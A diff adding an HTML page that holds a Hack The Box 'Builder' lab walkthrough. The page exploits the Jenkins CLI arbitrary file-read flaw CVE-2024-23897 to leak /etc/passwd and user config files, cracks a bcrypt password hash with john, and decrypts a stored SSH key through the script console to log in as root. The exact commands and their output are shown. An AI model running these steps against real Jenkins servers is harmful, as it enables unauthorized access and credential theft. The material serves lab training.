@@ -1,0 +1,233 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}"> 
+</head>
+<body>
+    <h1 class="title">HTB Builder</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;TARGET_IP&gt; --min-rate=2000</u>
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+8080/tcp open  http    Jetty 10.0.18
+| http-robots.txt: 1 disallowed entry 
+|_/
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-title: Dashboard [Jenkins]
+|_http-server-header: Jetty(10.0.18)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/builder/1-website.png' %}" alt="">
+    <p class="text">As you can see, this webpage uses jenkins which is open-source automation server. Let's search the version of jenkins because it may have vulnerability. </p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/builder/2-version.png' %}" alt="">
+    <p class="text">Luckily, we can find the version on inspect tab. Its version is 2.441. </p>
+</div>
+
+<p class="text">A little research revealed that Jenkins v2.441 has Arbitrary File Leak Vulnearbility. </p>
+<p class="text">CVE-2024-23897s a vulnerability in Jenkins that allows unauthenticated users to read arbitrary files on the server via crafted CLI requests, due to improper handling of command arguments. It affects Jenkins versions before 2.442 and LTS before 2.426.3.</p>
+<p class="text">With a further search, we can know that we can install cli from the remote machine according to the <a href="https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client">documentation</a>.</p>
+    <img src="{% static 'EthHack/images/builder/3-jenkins.png' %}" alt="">
+
+<div class="code-box"><pre><code>└─$ <u>wget 10.129.230.220:8080/jnlpJars/jenkins-cli.jar</u>
+└─$ <u>java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help</u>
+<u class="green">...snip...</u>
+  update-node
+    Updates the node definition XML from stdin. The opposite of the get-node command.
+  update-view
+    Updates the view definition XML from stdin. The opposite of the get-view command.
+  version
+    Outputs the current version.
+  wait-node-offline
+    Wait for a node to become offline.
+  wait-node-online
+    Wait for a node to become online.
+  who-am-i
+    Reports your credential and permissions.</code></pre></div>
+
+<p class="text">When Jenkins CLI tool arguments are prefixed with “@”, they are mistakenly interpreted as files that need to be opened to read the arguments.</p>
+
+<div class="code-box"><pre><code>└─$ <u>java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/etc/passwd"</u>
+Sep 23, 2025 5:22:38 AM hudson.cli.CLI _main
+INFO: Skipping HTTPS certificate checks altogether. Note that this is not secure at all.
+
+ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)</code></pre></div>
+
+<p class="text">/etc/passwd file is leaked.</p>
+
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">Then, if we can know the directory structure of this webpage, we should be able to get credential files with this way. Therefore, let's find out the directory name.</p>
+<p class="text">In this case, we can make use of useful file '/proc/self/environ', which is a virtual file in Linux that shows the environment variables of the current process</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>ava -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/proc/self/environ"</u>j
+HOSTNAME=0f52c222a4cc<SNIP>HOME=/var/jenkins_home<SNIP></code></pre></div>
+
+<p class="text">However, trying several configuration file name which is common name which we can find on documentaion doesn't return interesting information. Therefore, creating the same environment with the target machine is the best practice for seeing directory structure. Let's do it.</p>
+
+<div class="code-box"><pre><code>└─$ <u>sudo docker pull jenkins/jenkins:lts-jdk17</u>
+└─$ <u>sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17</u>
+[LF]> Jenkins initial setup is required. An admin user has been created and a password generated.
+[LF]> Please use the following password to proceed to installation:
+[LF]> 
+[LF]> c049fe32e171401b98fd083633a2c6ca
+[LF]> 
+[LF]> This may also be found at: /var/jenkins_home/secrets/initialAdminPassword
+[LF]> 
+[LF]> ****</code></pre></div>
+
+<p class="text">Then, open http://127.0.0.1:8080 and login with this credential. After waiting downloads, it returns admin user creation page. Just follow instruction till the setup ends.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/builder/4-jenkins.png' %}" alt="">
+    <img src="{% static 'EthHack/images/builder/5-jenkins.png' %}" alt="">
+</div>
+
+<p class="text">After setup...</p>
+
+<div class="code-box"><pre><code>└─$ <u>sudo docker ps -a      </u>           
+[sudo] password for kali: 
+CONTAINER ID   IMAGE                       COMMAND                  CREATED         STATUS         PORTS                                                    NAMES
+<u>2b32e9d6427f</u>  jenkins/jenkins:lts-jdk17   "/usr/bin/tini -- /u…"   7 minutes ago   Up 7 minutes   0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp, 50000/tcp   busy_dhawan
+<u class="green">↑#The string '2b32e9d6427f' would be unique code. Use your own one.</u></code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>sudo docker start 2b3</u>
+
+2b3</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>sudo docker exec -it 2b3 bash</u>
+jenkins@2b32e9d6427f:/$ ls
+bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+jenkins@2b32e9d6427f:/$ cd ~
+jenkins@2b32e9d6427f:~$ ls
+config.xml                      jenkins.install.InstallUtil.lastExecVersion     logs                      secrets
+copy_reference_file.log         jenkins.install.UpgradeWizard.state             nodeMonitors.xml          updates
+hudson.model.UpdateCenter.xml   jenkins.model.JenkinsLocationConfiguration.xml  plugins                   userContent
+hudson.plugins.git.GitTool.xml  jenkins.telemetry.Correlator.xml                secret.key                users
+identity.key.enc                jobs                                            secret.key.not-so-secret  war
+jenkins@2b32e9d6427f:~$ ls users
+admin_8634394067689892598  <u>users.xml</u>
+
+
+<u>jenkins@2b32e9d6427f:~$ cat users/users.xml</u>
+&lt;?xml version='1.1' encoding='UTF-8'?&gt;
+&lt;hudson.model.UserIdMapper&gt;
+  &lt;version&gt;1&lt;/version&gt;
+  &lt;idToDirectoryNameMap class="concurrent-hash-map"&gt;
+    &lt;entry&gt;
+      &lt;string&gt;admin&lt;/string&gt;
+      &lt;string&gt;<u>admin_8634394067689892598</u>&lt;/string&gt;
+    &lt;/entry&gt;
+  &lt;/idToDirectoryNameMap&gt;
+&lt;/hudson.model.UserIdMapper&gt;
+
+
+jenkins@2b32e9d6427f:~/users$ ls
+<u>admin_8634394067689892598</u>  users.xml
+jenkins@2b32e9d6427f:~/users$ 
+
+jenkins@2b32e9d6427f:~/users/admin_8634394067689892598$ ls
+<u>config.xml</u>
+</code></pre></div>
+
+
+<p class="text">We got user credential file location. However, cli code doesn't return file contents because of file size. We need to find the way to read entire file.</p>
+
+<div class="code-box"><pre><code>└─$ <u>java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help "@/var/jenkins_home/users/users.xml"</u>
+Sep 23, 2025 6:09:48 AM hudson.cli.CLI _main
+INFO: Skipping HTTPS certificate checks altogether. Note that this is not secure at all.
+
+ERROR: Too many arguments: &lt;hudson.model.UserIdMapper>
+java -jar jenkins-cli.jar help [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command (default: <?xml version='1.1' encoding='UTF-8'?>)
+</code></pre></div>
+
+<p class="text">Revisiting cli help reveals  ... <u>connect-node
+    Reconnect to a node(s)</u> command.
+</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' connect-node "@/var/jenkins_home/users/users.xml"</u>
+
+    Sep 23, 2025 6:14:34 AM hudson.cli.CLI _main  
+INFO: Skipping HTTPS certificate checks altogether. Note that this is not secure at all.  
+&lt;?xml version='1.1' encoding='UTF-8'?&gt;: No such agent "&lt;?xml version='1.1' encoding='UTF-8'?&gt;" exists.  
+      &lt;string&gt;<u>jennifer_12108429903186576833</u>&lt;/string&gt;: No such agent "      &lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;" exists.  
+  &lt;idToDirectoryNameMap class="concurrent-hash-map"&gt;: No such agent "  &lt;idToDirectoryNameMap class="concurrent-hash-map"&gt;" exists.  
+    &lt;entry&gt;: No such agent "    &lt;entry&gt;" exists.  
+      &lt;string&gt;jennifer&lt;/string&gt;: No such agent "      &lt;string&gt;jennifer&lt;/string&gt;" exists.  
+  &lt;version&gt;1&lt;/version&gt;: No such agent "  &lt;version&gt;1&lt;/version&gt;" exists.  
+&lt;/hudson.model.UserIdMapper&gt;: No such agent "&lt;/hudson.model.UserIdMapper&gt;" exists.  
+  &lt;/idToDirectoryNameMap&gt;: No such agent "  &lt;/idToDirectoryNameMap&gt;" exists.  
+&lt;hudson.model.UserIdMapper&gt;: No such agent "&lt;hudson.model.UserIdMapper&gt;" exists.  
+    &lt;/entry&gt;: No such agent "    &lt;/entry&gt;" exists.  
+
+ERROR: Error occurred while performing this command, see previous stderr output.
+</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' connect-node "@/var/jenkins_home/users/users.xml"</u>
+<u class="green">snip....</u>
+&lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;: No such agent "      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;"
+<u class="green">....snip</u></code></pre></div>
+
+<p class="text">We finally got hashed password. Let's decode it with john.</p>
+
+<div class="code-box"><pre><code>└─$ <u>echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' > hash</u>
+└─$ <u>john hash --wordlist=/usr/share/wordlists/rockyou.txt</u>
+
+    princess</code></pre></div>
+
+    <p class="text">The login credentail is <u>jennifer : princess</u>. Login to Jenkins with it.</p>
+
+
+
+    <h2 class="subtitle">PrivEsc</h2>
+    <div class="img">
+        <img src="{% static 'EthHack/images/builder/6-ssh.png' %}" alt="">
+        <p class="text">On the Dashboard &lt; Manage Jenkins, we can see credential tab. Forwarding to the &lt; System &lt; Global Credentaials, we can find <u>SSH Username with private key</u>.</p>
+    </div>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/builder/7-key.png' %}" alt="">
+        <p class="text">This page has hidden encrypted ssh key. If we can decrypt this, we can establish connection with root directly because the owner is root. The encrypted code end with = character, so it might be base64 encryption.</p>
+    </div>
+    <p class="text">We navigate to /manage/script, we can decode it very easily. </p>
+    <div class="code-box"><pre><code>println( hudson.util.Secret.decrypt("{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}") )
+    <u class="green"># on jenkins script tab.</u>
+    </code></pre></div>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/builder/8-sshkey.png' %}" alt="">
+        <p class="text">We got ssh id_rsa. At last, copy and paste this and establish connection.</p>
+    </div>
+
+    <div class="code-box"><pre><code>└─$ <u>chmod 600 id_rsa</u>
+└─$ <u>ssh -i id_rsa root@10.129.230.220</u>
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Feb 12 13:15:44 2024 from 10.10.14.40
+root@builder:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@builder:~# ls
+root.txt</code></pre></div>
+</body>
+</html>
